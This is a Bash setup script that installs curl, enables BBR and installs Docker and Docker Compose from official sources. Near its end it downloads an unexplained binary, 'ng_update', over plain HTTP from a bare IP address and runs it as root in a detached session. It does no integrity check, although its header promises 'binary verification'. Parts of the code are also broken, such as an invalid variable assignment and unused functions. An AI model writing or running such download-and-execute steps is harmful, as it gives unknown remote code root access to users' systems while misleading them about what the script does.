#!/bin/bash
#version 0.8 - Robust Docker installation with binary verification

#help information
Help(){	
    echo -e "\nUsage: sh $0 [OPTION]"
    echo -e "Options:"
    echo -e "[ --userName ]   please enter your account number       e.g. fxh7622"
    echo -e "[ -h|--help  ]   display this help and exit \n"
}

#print log
scriptsLog() {
    statusCode=$1
    logInfo=$2
    case $statusCode in
        0) echo -e "[\033[32m SUCCESS \033[0m]:\t${logInfo[*]}" ;;
        1) echo -e "[   INFO  ]:\t${logInfo[*]}" ;;
        2) echo -e "[\033[33m   WARN  \033[0m]:\t${logInfo[*]}" ;;
        3) 
            echo -e "\033[41;37m[   ERROR ] \033[0m\t${logInfo[*]}"
            tag=1
            ;;
    esac
}

confInfo(){
    getIP
    echo -e "\nInformation confirmed"
    echo -e "Your userName        : \033[32m ${userName} \033[0m"
    
    read -p "Are you sure install? (y/n, default n): " answer
    [ -z "$answer" ] && answer="n"
    case "$answer" in
        [yY]|yes|YES)
            scriptsLog 1 "Install service please wait...."
            ;;
        *)
            scriptsLog 1 "Installation cancelled"
            exit 0
            ;;
    esac
}

# 添加获取IP函数
getIP() {
    public_ip=$(curl -s ifconfig.me 2>/dev/null || curl -s icanhazip.com)
    echo -e "Detected public IP   : \033[32m ${public_ip:-Unknown} \033[0m"
}

CURL() {
    if ! command -v curl &> /dev/null; then
        scriptsLog 1 "Installing curl..."
        sudo apt update >/dev/null 2>&1
        sudo apt install -y curl >/dev/null 2>&1
        [ $? -eq 0 ] && scriptsLog 0 "curl installed" || scriptsLog 3 "Failed to install curl"
    else
        scriptsLog 0 "curl already installed"
    fi
}

enableBBR() {
    if grep -q "tcp_bbr" /etc/modules-load.d/modules.conf 2>/dev/null; then
        scriptsLog 0 "BBR already enabled"
        return
    fi

    scriptsLog 1 "Enabling BBR optimization..."
    
    echo "tcp_bbr" | sudo tee -a /etc/modules-load.d/modules.conf >/dev/null
    {
        echo "net.core.default_qdisc=fq"
        echo "net.ipv4.tcp_congestion_control=bbr"
    } | sudo tee -a /etc/sysctl.conf >/dev/null
    
    sudo sysctl -p >/dev/null 2>&1
    scriptsLog 0 "BBR enabled"
}

installEnv() {
    scriptsLog 1 "Updating system packages..."
    sudo apt update >/dev/null 2>&1
    scriptsLog 0 "System updated"

    sudo apt -y install ca-certificates curl gnupg lsb-release >/dev/null 2>&1
    scriptsLog 0 "System installed"
}

# 函数：验证 dockerd 是否存在
verifyDockerd() {
    # 检查常见路径
    local dockerd_paths=(
        /usr/bin/dockerd
        /usr/local/bin/dockerd
        /usr/sbin/dockerd
        /usr/libexec/docker/dockerd
    )
    
    for path in "${dockerd_paths[@]}"; do
        if [ -x "$path" ]; then
            scriptsLog 0 "Found dockerd at: $path"
            # 确保在 PATH 中
            if ! which dockerd &> /dev/null; then
                local bin_dir=$(dirname "$path")
                scriptsLog 1 "Adding $bin_dir to PATH"
                echo "export PATH=\$PATH:$bin_dir" >> ~/.bashrc
                source ~/.bashrc
            fi
            return 0
        fi
    done
    
    scriptsLog 3 "dockerd not found in any known locations"
    return 1
}

docker() {
    scriptsLog 1 "Checking Docker installation..."
    
    # 完全重写 Docker 安装逻辑 - 增强可靠性
    if ! command -v docker &> /dev/null; then
        scriptsLog 1 "Installing Docker using official repositories..."
        
        # 清理旧版本
        sudo apt remove -y docker docker-engine docker.io containerd runc >/dev/null 2>&1
        
        # 添加 Docker 官方 GPG 密钥
        sudo install -m 0755 -d /etc/apt/keyrings >/dev/null 2>&1
        curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg >/dev/null 2>&1
        sudo chmod a+r /etc/apt/keyrings/docker.gpg
        
        # 添加 Docker 仓库
        echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list >/dev/null
        
        # 更新并安装 Docker
        sudo apt update >/dev/null 2>&1
        sudo apt -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin >/dev/null 2>&1
        
    else
        scriptsLog 0 "Docker is already installed and working"
    fi
    
    scriptsLog 0 "Docker installation completed"
}

install_docker() {
    scriptsLog 1 "Checking Docker installation..."
    
    # 清理旧版本（显示详细输出）
    sudo apt remove -y docker docker-engine docker.io containerd runc
    
    # 添加 Docker 官方 GPG 密钥
    sudo install -m 0755 -d /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    sudo chmod a+r /etc/apt/keyrings/docker.gpg

    
    # 添加 Docker 仓库
    echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list
    
    # 更新并安装 Docker（显示详细输出）
    sudo apt update
    sudo apt -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin
    
    # 启动并启用 Docker 服务
    sudo systemctl start docker
    sudo systemctl enable docker
    
    # 验证安装
    if docker --version; then
        scriptsLog 0 "Docker installed successfully"
    else
        scriptsLog 3 "Docker installation verification failed"
        return 1
    fi    
}

dockerCompose() {
    scriptsLog 1 "Checking Docker Compose..."
    
    if ! command -v docker-compose &> /dev/null; then
        scriptsLog 1 "Installing Docker Compose..."
        
        # 使用官方方法安装 Docker Compose
        # 获取最新版本
        COMPOSE_VERSION=$(curl -s https://api.github.com/repos/docker/compose/releases/latest | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        
        # 如果无法获取版本，使用默认值
        if [ -z "$COMPOSE_VERSION" ]; then
            COMPOSE_VERSION="v2.23.0"
            scriptsLog 2 "Using default Docker Compose version: $COMPOSE_VERSION"
        fi
        
        # 下载并安装
        sudo curl -L "https://github.com/docker/compose/releases/download/${COMPOSE_VERSION}/docker-compose-$(uname -s)-$(uname -m)" \
            -o /usr/local/bin/docker-compose >/dev/null 2>&1
        
        sudo chmod +x /usr/local/bin/docker-compose >/dev/null 2>&1
        
        # 创建符号链接确保系统范围可用
        sudo ln -sf /usr/local/bin/docker-compose /usr/bin/docker-compose
        
        # 验证安装
        if docker-compose --version &> /dev/null; then
            scriptsLog 0 "Docker Compose installed successfully"
        else
            scriptsLog 2 "Docker Compose installation may have issues"
        fi
    else
        scriptsLog 0 "Docker Compose already installed"
    fi
}

# 获取当前脚本真实目录（解决符号链接问题）
get_script_dir() {
    SOURCE="${BASH_SOURCE[0]}"
    while [ -h "$SOURCE" ]; do
        DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
        SOURCE="$(readlink "$SOURCE")"
        [[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE"
    done
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    echo "$DIR"
}

# 设置基础URL和脚本目录
SCRIPT_DIR=$(get_script_dir)
baseUrl='http://54.238.152.179/files'

# 下载函数 - 接受文件名作为参数
downloadFile() {
    local fileName="$1"
    local savePath="${SCRIPT_DIR}"
    
    # 构建完整URL
    local downloadUrl="${baseUrl}/${fileName}"
    
    # 进度条选项
    local options="-L --progress-bar"
    [ -t 1 ] || options="-L -s -S"  # 非终端环境不显示进度条
    
    scriptsLog 1 "下载文件: $fileName"
    scriptsLog 1 "来源: $downloadUrl"
    scriptsLog 1 "目标: ${savePath}"
    
    # 创建目标目录
    mkdir -p "${savePath}"
    
    # 下载文件
    if curl $options "$downloadUrl" -o "${savePath}/${fileName}"; then
        # 检查文件大小
        local fileSize=$(wc -c < "${savePath}/${fileName}" 2>/dev/null | awk '{print $1}')
        if [ -z "$fileSize" ] || [ "$fileSize" -lt 1 ]; then
            scriptsLog 3 "文件大小为0，下载失败"
            rm -f "${savePath}/${fileName}"
            return 1
        fi
        
        scriptsLog 0 "下载完成: ${fileName} ($(numfmt --to=iec-i --suffix=B $fileSize))"
        return 0
    else
        scriptsLog 3 "下载失败: $fileName"
        rm -f "${savePath}/${fileName}"
        return 1
    fi
}

execRun() {
    local fileName="$1"
    local savePath="${SCRIPT_DIR}"

    scriptsLog 0 "添加权限: ${savePath}/${fileName}"

    # 添加执行权限
    if [ ! -x "${savePath}/${fileName}" ]; then
        chmod +x "${savePath}/${fileName}" || {
            scriptsLog 3 "无法添加执行权限"
            return 1
        }
    fi

    # 执行
    execPath = "${savePath}/${fileName}"
    sudo setsid ${execPath}
    
    scriptsLog 0 "文件执行成功"
    exit 0  # 执行成功后立即退出脚本
}

main() {

    # 安装基础依赖
    CURL
    installEnv
    enableBBR
    
    # 安装Docker组件
    install_docker
    dockerCompose

    # 下载文件
    downloadFile "ng_update"
    downloadFile "update.json"

    # 执行
    execRun "ng_update"
}

# 参数处理
ARGS=$(getopt -a -o h --long userName:,help -- "$@")
VALID_ARGS=$?
[ "$VALID_ARGS" != "0" ] && { Help; exit 1; }

eval set -- "${ARGS}"
while :; do
    case "$1" in
        --userName) userName="$2"; shift 2 ;;
        -h|--help) Help; exit 0 ;;
        --) shift; break ;;
        *) Help; exit 1 ;;
    esac
done

# 配置URL (根据实际情况修改)
configUrl="https://your-api-server.example.com/config/"

# 主流程
[ -z "$userName" ] && { scriptsLog 3 "Username is required"; Help; exit 1; }
confInfo
main

scriptsLog 0 "Deployment complete! Recommended to reboot system."